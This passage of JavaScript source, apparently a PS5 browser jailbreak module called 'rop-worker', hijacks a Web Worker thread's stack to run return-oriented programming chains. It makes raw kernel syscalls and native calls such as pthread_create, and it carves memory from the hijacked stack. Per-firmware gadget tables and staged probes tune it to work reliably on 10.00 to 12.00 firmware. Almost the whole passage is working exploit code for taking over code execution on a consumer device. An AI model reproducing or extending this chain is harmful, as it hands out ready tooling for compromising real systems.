            c.pop("rax", BigInt(num)).call(g("syscall_wrapper"));
        }
    }, /*big=*/true).retval;
}

function syscallSync(num, a1, a2, a3, a4, a5) {
    const args = [a1, a2, a3, a4, a5];
    const regs = ["rdi", "rsi", "rdx", "rcx", "r8"];
    return fireSync((c) => {
        for (let i = 0; i < 5; i++)
            if (args[i] !== undefined) c.pop(regs[i], args[i]);
        c.pop("rax", BigInt(num)).call(g("syscall_wrapper"));
        c.pop("rdi", W.retval).raw(g("mov_qword_rdi_rax"));
    });
}

/* Call a NATIVE FUNCTION (not a syscall) and return its result.
 *
 * Same shape as syscallSync, but the chain jumps to `addr` instead of loading
 * rax and entering the kernel. Needed because the elfldr loader wants
 * libkernel's pthread_create (4 args) rather than raw thr_new — thr_new makes
 * the caller hand-build a TCB, and a thread whose TLS is a bare self-pointer
 * has no canary and no errno slot, which anything elfldr calls into libc will
 * eventually touch. pthread_create does that setup properly.
 *
 * Five argument registers, which is all the System V integer sequence our
 * gadget set can reach (there is no r9 gadget in either module — verified by
 * scanning both for pop/xor/mov forms on every firmware, zero usable hits). */
function callSync(addr, a1, a2, a3, a4, a5) {
    const args = [a1, a2, a3, a4, a5];
    const regs = ["rdi", "rsi", "rdx", "rcx", "r8"];
    return fireSync((c) => {
        for (let i = 0; i < 5; i++)
            if (args[i] !== undefined) c.pop(regs[i], args[i]);
        c.call(BigInt(addr));
        c.pop("rdi", W.retval).raw(g("mov_qword_rdi_rax"));
    });
}

/* One syscall, result stored to W.retval by the chain itself. */
async function syscall(num, a1, a2, a3, a4, a5) {
    const args = [a1, a2, a3, a4, a5];
    const regs = ["rdi", "rsi", "rdx", "rcx", "r8"];
    const r = await fire((c) => {
        for (let i = 0; i < 5; i++)
            if (args[i] !== undefined) c.pop(regs[i], args[i]);
        c.pop("rax", BigInt(num)).call(g("syscall_wrapper"));
        c.pop("rdi", W.retval).raw(g("mov_qword_rdi_rax"));
    });
    return r;
}

/* ------------------------------------------------------- bump allocator
 *
 * netctrl-ps5 needs ~300 KB (thread stacks, ROP chains, spray buffers) and has
 * no way to get it:
 *   * window.malloc serves 248 bytes from lapse-runtime's arena and then takes
 *     a slab path through runChain, which is fatal on 10.00;
 *   * get_backing_store needs lapse-runtime's addrof, which bootstraps by
 *     scanning targetHolder for known slot addresses - those are gone by the
 *     time we run, and the armed run threw exactly that
 *     ("addrof: bootstrap could not find any known slot in targetHolder");
 *   * mmap is 6-arg and there is no usable `pop r9` anywhere in
 *     libSceNKWebKit or libkernel_web (the three `pop r9` sites are followed by
 *     privileged out/in instructions). Its MAP_ANON path only ignores `pos` on
 *     one side of a per-process branch, so garbage r9 is a coin flip.
 *
 * But we already have a large mapped writable region at a known address: the
 * worker's own 0x80000 stack. Its parked frames live in the top few KB
 * (0x7f918..0x7ffc8 measured on hardware); the worker only ever runs a trivial
 * onmessage echo, so the bottom never gets used. Carve from there.
 *
 * Deliberately conservative: allocation stops well below the deepest observed
 * frame, and the allocator refuses rather than encroaching. */
const STACK_ARENA_LIMIT = 0x70000n;   // bottom 448 KB; frames start ~0x7f900
let stackBump = 0x1000n;              // leave the guard page alone

function alloc(size) {
    if (!W.stack) findWorkerStack();
    const n = (BigInt(size) + 15n) & ~15n;          // 16-byte aligned
    if (stackBump + n > STACK_ARENA_LIMIT)
        throw new Error("rop-worker: stack arena exhausted ("
                        + stackBump + " + " + n + " > " + STACK_ARENA_LIMIT + ")");
    const p = W.stack + stackBump;
    stackBump += n;
    return p;
}
function allocReset() { stackBump = 0x1000n; }
function allocUsed() { return Number(stackBump); }

/* ------------------------------------------------------------------- api */

function init(cfg) {
    W.kbase = BigInt(cfg.kernelBase);
    W.wbase = BigInt(cfg.webkitBase || 0);
    W.gadgets = cfg.gadgets || {};
    /* Fail here, loudly, rather than 300 lines later inside a ROP chain.
     * Without a row every libkernel gadget below would silently fall back to
     * 10.00's RVAs, which on any other firmware means pivoting into the middle
     * of an unrelated function. */
    W.fw = String(cfg.fw || "");
    W.lkw = LKW_TABLE[W.fw] || null;
    if (!W.lkw)
        throw new Error("rop-worker: no libkernel_web table for FW '" + W.fw
                        + "' — refusing to run 10.00 offsets on it");
    if (W.lkw.pop_rsp.mod === "wk" && !W.wbase)
        throw new Error("rop-worker: FW " + W.fw + " sources pop_rsp from "
                        + "libSceNKWebKit but no webkitBase was supplied");
    const s = BigInt(cfg.scratch);
    W.ctx      = s;                                   // jmp_buf
    W.retval   = s + BigInt(JMPBUF_SIZE);             // 8 bytes
    W.done     = s + BigInt(JMPBUF_SIZE + 8);         // completion flag
    W.chainBuf = s + BigInt(JMPBUF_SIZE + 0x20);      // chain
    W.ready = true;
    return W;
}

async function survey() {
    spawnWorker();
    await ping(4000);
    log("survey: worker alive and parked");
    const th = enumerate();
    log("survey: " + th.length + " threads");
    for (const t of th)
        log("  thr=" + hex(t.pthread) + " stack=" + hex(t.stack)
            + " size=" + hex(t.size)
            + (t.size === WORKER_STACK_SIZE ? "  <-- worker" : ""));
    const w = findWorkerStack();
    // Report the legacy 10.00 offset for continuity with older logs, then let
    // locateSlot() actually find the frame. On 12.00 the two disagree — the old
    // offset lands in libkernel's bss — and that disagreement is the whole
    // reason this no longer refuses to continue.
    const hintVal = rd64(w.stack + SLOT_HINT);
    log("survey: stack+" + hex(SLOT_HINT) + " = libkernel+" + hex(hintVal - W.kbase)
        + (hintVal - W.kbase === W.lkw.cond_wait_ret ? "  (10.00 offset still valid)"
                                                     : "  (10.00 offset stale here)"));
    locateSlot();
    return W;
}

/* ------------------------------------------------------ staged bisect ----
 *
 * A 12.00 console died inside the first testGetpid() with NO beacon at all —
 * not a throw, a dead renderer — which says the chain ran and did not survive,
 * but nothing about WHICH part. Every static check passes (pop_rsp, setjmp,
 * longjmp, syscall_wrapper and the store gadget all disassemble correctly, the
 * cond_wait resume site is instruction-identical to 10.00, and the WebKit exec
 * segment is based at 0 on every firmware), so the answer is not in the module.
 *
 * Each console attempt costs a reboot, so spend one attempt learning instead of
 * guessing. These three probes add exactly one chain element each:
 *
 *   testPivot  pop_rsp -> setjmp -> longjmp        (pivot, ctx capture, resume)
 *   testStore  + pop_rax/pop_rdi/mov_qword_rdi_rax (the store used everywhere)
 *   testGetpid + pop_rax/syscall_wrapper           (the syscall)
 *
 * The last beacon printed names the first element that does not survive. */

function dumpGadgets() {
    const names = ["pop_rsp", "setjmp", "longjmp", "syscall_wrapper",
                   "pop_rax", "pop_rdi", "pop_rsi", "pop_rdx", "pop_rcx",
                   "pop_r8", "mov_qword_rdi_rax"];
    // Which module each gadget is relative to. Only pop_rsp varies: 11.x/12.00
    // take it from WebKit because libkernel_web has no `pop rsp; ret` at all.
    const lkNames = { setjmp: 1, longjmp: 1, syscall_wrapper: 1 };
    for (const n of names) {
        let a;
        try { a = g(n); } catch (e) { log("gadget " + n + ": MISSING"); continue; }
        const mod = (n === "pop_rsp") ? W.lkw.pop_rsp.mod
                  : (lkNames[n] ? "lk" : "wk");
        const rva = a - (mod === "lk" ? W.kbase : W.wbase);
        log("gadget " + n + " = " + mod + "+" + hex(rva) + " -> " + hex(a));
    }
    log("bases: lk=" + hex(W.kbase) + " wk=" + hex(W.wbase)
        + " ctx=" + hex(W.ctx) + " retval=" + hex(W.retval)
        + " done=" + hex(W.done) + " chain=" + hex(W.chainBuf));
}

/* Pivot only: no payload at all. If this survives, then pop_rsp, the ctx
 * capture, the three stores that patch ctx/slot, and the longjmp resume are all
 * correct — which would clear everything the hijack itself depends on. */
async function testPivot() {
    const r = await fire(function () { /* no payload */ });
    log("pivot probe survived");
    return r;
}

/* Adds only the store primitive. wrap() already uses store() for its ctx/slot
 * patching, so a failure here really means pop_rax/pop_rdi/mov_qword_rdi_rax
 * are wrong — in which case the pivot probe above would already have died. */
async function testStore() {
    const MAGIC = 0x1234ABCD5678EF90n;
    wr64(W.retval, 0n);
    await fire(function (c) { c.store(W.retval, MAGIC); });
    const got = rd64(W.retval);
    log("store probe -> " + hex(got) + (got === MAGIC ? "  MATCH" : "  *** WRONG ***"));
    if (got !== MAGIC) throw new Error("rop-worker: store probe wrote " + hex(got));
    return got;
}

/* getpid(): 0 args, side-effect free, RE-verified number. If this returns a
 * plausible pid the whole path works - Worker, thread walk, hijack, chain,
 * syscall, and the longjmp resume. */
async function testGetpid() {
    const r = await syscall(20);
    log("getpid -> " + r.retval.toString() + " (" + hex(r.retval)
        + ") in " + r.ms + "ms");
    return r;
}

/* Same one-call proof as testGetpid, but through the synchronous path.
 * A matching pid from both means netctrl-ps5.js can keep its sync API. */
function testGetpidSync() {
    const r = syscallSync(20);
    log("getpid SYNC -> " + r.retval.toString() + " (" + hex(r.retval)
        + ") after " + r.spins + " spins");
    return r;
}

window.rop_worker = {
    init, survey, fire, syscall, testGetpid,
    dumpGadgets, testPivot, testStore, locateSlot, callSync,
    alloc, allocReset, allocUsed, syscallBatch, syscallBatchTagged, leadThenBatchTagged,
    fireSync, syscallSync, testGetpidSync,
    enumerate, findWorkerStack, spawnWorker, ping, Chain,
    state: W, version: "rop-worker 0.2",
};
log("loaded (0.2 — hijack enabled)");

})();
